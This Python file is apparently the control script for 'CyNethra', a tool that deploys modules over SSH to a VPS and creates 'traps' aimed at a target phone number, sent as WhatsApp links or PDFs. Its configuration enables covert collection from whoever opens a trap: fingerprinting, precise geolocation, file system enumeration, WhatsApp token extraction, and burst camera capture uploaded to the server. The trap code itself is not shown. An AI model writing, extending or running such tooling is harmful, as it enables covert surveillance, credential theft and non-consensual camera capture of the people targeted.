# -*- coding: utf-8 -*-
import os
import sys
import json
import time
import argparse
import paramiko
from datetime import datetime

# ==============================================================================
# CONFIGURATION
# ==============================================================================
VPS_HOST = "5.189.130.88"
VPS_USER = "root"
VPS_PASSWORD = None  # Set your password here if not using SSH keys
LOCAL_DIR = r"C:\Users\seeka\Desktop\CyNethra\scripts"
REMOTE_BASE = "/root/CyNethra"
REMOTE_SCRIPTS = f"{REMOTE_BASE}/scripts"
SERVICE_NAME = "cynethra.service"

# Files to deploy to the VPS
FILES_TO_UPLOAD = [
    ("cynethra_honeytrap.py", f"{REMOTE_SCRIPTS}/cynethra_honeytrap.py"),
    ("cynethra_field_bot.py", f"{REMOTE_SCRIPTS}/cynethra_field_bot.py"),
    ("cynethra_pdf_forge.py", f"{REMOTE_SCRIPTS}/cynethra_pdf_forge.py"),
]

# ==============================================================================
# ADVANCED TRAP CONFIGURATION GENERATOR
# ==============================================================================
def get_advanced_config(target_number, trap_type="whatsapp", session_id="auto", target_url=None, delivery="pdf"):
    """
    Generates the comprehensive intelligence collection configuration.
    """
    return {
        "target": target_number,
        "channel": trap_type,
        "session_id": session_id,
        "target_url": target_url,
        "delivery": delivery,  # "pdf" or "url"
        "fingerprinting": {
            "canvas": True,
            "webgl": True,
            "audio": True,
            "fonts": True,
            "timezone": True,
            "locale": True,
            "screen": True,
            "hardware": True,
            "battery": True,
            "network": True,
            "storage": True,
            "media": True,
            "file_system": True,  # NEW: File system enumeration
            "user_agent": True,
            "webdriver": True
        },
        "location": {
            "enable": True,
            "high_accuracy": True,
            "ip_fallback": True,
            "watch_position": False,
            "timeout": 10000
        },
        "behavioral": {
            "mouse_tracking": True,
            "scroll_tracking": True,
            "click_heatmap": True,
            "time_on_page": True,
            "tab_focus": True,
            "pdf_interactions": True  # NEW: PDF-specific interactions
        },
        "network_intel": {
            "dns_leak": True,
            "cdn_detection": True,
            "ip_details": True,
            "proxy_detection": True
        },
        "whatsapp_context": {
            "extract_tokens": True,
            "session_state": True,
            "contact_graph": False
        },
        "media_capture": {
            "enable": True,
            "devices": ["user", "environment"],
            "resolution": {
                "width": 1280,
                "height": 720
            },
            "frame_rate": 30,
            "capture_mode": "burst",
            "burst_count": 10,
            "save_webm": True,
            "upload_path": "/root/CyNethra/reports/media"
        },
        "pdf_specific": {
            "enable": True,
            "page_tracking": True,
            "zoom_tracking": True,
            "annotation_tracking": True,
            "print_detection": True,
            "download_detection": True,
            "viewer_detection": True
        },
        "output_format": "json"
    }

# ==============================================================================
# SSH HELPER CLASS
# ==============================================================================
class CyNethraClient:
    def __init__(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
    def connect(self):
        print(f"[*] Connecting to VPS {VPS_HOST}...")
        kwargs = {"username": VPS_USER, "timeout": 15}
        if VPS_PASSWORD:
            kwargs["password"] = VPS_PASSWORD
        self.client.connect(VPS_HOST, **kwargs)
        print("[OK] Connected.")
        
    def exec(self, command, capture=True):
        """Execute a command and return stdout/stderr."""
        print(f"[*] Executing: {command[:100]}{'...' if len(command) > 100 else ''}")
        stdin, stdout, stderr = self.client.exec_command(command)
        if capture:
            out = stdout.read().decode('utf-8', errors='ignore')
            err = stderr.read().decode('utf-8', errors='ignore')
            return out, err
        return stdin, stdout, stderr
        
    def upload_files(self, files):
        sftp = self.client.open_sftp()
        self.exec(f"mkdir -p {REMOTE_SCRIPTS} {REMOTE_BASE}/reports/media {REMOTE_BASE}/Database/traps {REMOTE_BASE}/pdf_output")
        
        for local_name, remote_path in files:
            local_path = os.path.join(LOCAL_DIR, local_name)
            if not os.path.exists(local_path):
                print(f"[WARN] Local file not found: {local_path}")
                continue
            print(f"[*] Uploading {local_name} -> {remote_path}")
            sftp.put(local_path, remote_path)
            print(f"[OK] Uploaded {local_name}")
        sftp.close()
        
    def close(self):
        self.client.close()

# ==============================================================================
# ACTIONS
# ==============================================================================
def action_deploy(client):
    """Upload scripts and restart service."""
    print("\n" + "="*50)
    print(" ACTION: DEPLOY")
    print("="*50)
    
    client.upload_files(FILES_TO_UPLOAD)
    
    print("[*] Restarting service...")
    out, err = client.exec(f"systemctl restart {SERVICE_NAME} && systemctl status {SERVICE_NAME} --no-pager -l")
    print(out[:1000])
    if err:
        print(f"[STDERR] {err[:500]}")
    print("[OK] Deployment complete.")

def action_status(client):
    """Check service status and recent logs."""
    print("\n" + "="*50)
    print(" ACTION: STATUS")
    print("="*50)
    
    out, _ = client.exec(f"systemctl status {SERVICE_NAME} --no-pager -l")
    print("SERVICE STATUS:\n" + out)
    
    print("\nRECENT LOGS (Last 20 lines):\n")
    out, _ = client.exec(f"journalctl -u {SERVICE_NAME} -n 20 --no-pager")
    print(out)

def action_logs(client, lines=50):
    """Tail service logs."""
    print("\n" + "="*50)
    print(f" ACTION: LOGS ({lines} lines)")
    print("="*50)
    out, _ = client.exec(f"journalctl -u {SERVICE_NAME} -n {lines} --no-pager")
    print(out)

def action_trap(client, args):
    """Create an advanced intelligence trap (URL or PDF)."""
    print("\n" + "="*50)
    print(" ACTION: CREATE ADVANCED TRAP")
    print("="*50)
    
    # Build config
    config = get_advanced_config(
        target_number=args.target,
        trap_type=args.channel,
        session_id=args.session,
        target_url=args.url,
        delivery=args.delivery
    )
    
    # Serialize config for shell
    config_json = json.dumps(config)
    
    # Construct Python command for the VPS
    py_script = f'''
import sys, json
sys.path.append("{REMOTE_SCRIPTS}")
import cynethra_honeytrap as h

config = {config_json}

# Create the trap
try:
    res = h.create_trap(
        config["target"],
        config["channel"],
        config["session_id"],
        target_url=config.get("target_url"),
        config=config,
        delivery=config.get("delivery", "url")
    )
    
    output = {{
        "status": "success",
        "trap_url": res.get("trap_url"),
        "pdf_url": res.get("pdf_url"),
        "session_id": res.get("session_id"),
        "timestamp": "{datetime.now().isoformat()}"
    }}
    print(json.dumps(output, indent=2))
except Exception as e:
    import traceback
    print(json.dumps({{"status": "error", "message": str(e), "traceback": traceback.format_exc()}}, indent=2))
'''
    
    # Write to temp file on VPS
    tmp_script = f"/tmp/cynethra_trap_{int(time.time())}.py"
    
    stdin, stdout, stderr = client.client.exec_command(f"cat > {tmp_script}")
    stdin.write(py_script)
    stdin.channel.shutdown_write()
    stdout.read()
    
    # Execute the temp script
    out, err = client.exec(f"{REMOTE_BASE}/venv/bin/python {tmp_script}")
    
    # Cleanup
    client.exec(f"rm -f {tmp_script}")
    
    if err:
        print(f"[STDERR] {err}")
        
    # Parse and display result
    try:
        result = json.loads(out)
        print("\n" + "="*50)
        print(" TRAP DEPLOYMENT RESULT")
        print("="*50)
        print(f"Target:    {result.get('trap_url', 'N/A')}")
        if result.get('pdf_url'):
            print(f"PDF URL: {result.get('pdf_url')}")
        print(f"Session:   {result.get('session_id', 'N/A')}")
        print(f"Status:    {result.get('status')}")
        if result.get("message"):
            print(f"Message:   {result.get('message')}")
    except json.JSONDecodeError:
        print("RAW OUTPUT:\n" + out)

def action_run(client, command):
    """Run arbitrary command on VPS."""
    print("\n" + "="*50)
    print(" ACTION: RUN COMMAND")
    print("="*50)
    out, err = client.exec(command)
    print("STDOUT:\n" + out)
    if err:
        print("STDERR:\n" + err)

# ==============================================================================
# CLI INTERFACE
# ==============================================================================
def main():
    parser = argparse.ArgumentParser(description="CyNethra Advanced Deployment & Control Tool")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    subparsers.add_parser('deploy', help='Upload scripts and restart service')
    subparsers.add_parser('status', help='Check service status and logs')
    
    log_parser = subparsers.add_parser('logs', help='View service logs')
    log_parser.add_argument('-n', type=int, default=50, help='Number of lines (default 50)')
    
    trap_parser = subparsers.add_parser('trap', help='Create advanced intelligence trap')
    trap_parser.add_argument('-t', '--target', required=True, help='Target phone number')
    trap_parser.add_argument('-c', '--channel', default='whatsapp', help='Channel type')
    trap_parser.add_argument('-s', '--session', default='auto', help='Session ID')
    trap_parser.add_argument('-u', '--url', help='Target URL to embed')
    trap_parser.add_argument('-d', '--delivery', default='pdf', choices=['pdf', 'url'], help='Delivery method')
    
    run_parser = subparsers.add_parser('run', help='Run arbitrary command on VPS')
    run_parser.add_argument('cmd', nargs='+', help='Command to execute')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
        
    client = CyNethraClient()
    client.connect()
    
    try:
        if args.command == 'deploy':
            action_deploy(client)
        elif args.command == 'status':
            action_status(client)
        elif args.command == 'logs':
            action_logs(client, args.n)
        elif args.command == 'trap':
            action_trap(client, args)
        elif args.command == 'run':
            action_run(client, ' '.join(args.cmd))
    except Exception as e:
        print(f"[ERROR] {e}")
        import traceback
        traceback.print_exc()
    finally:
        client.close()

if __name__ == "__main__":
    main()
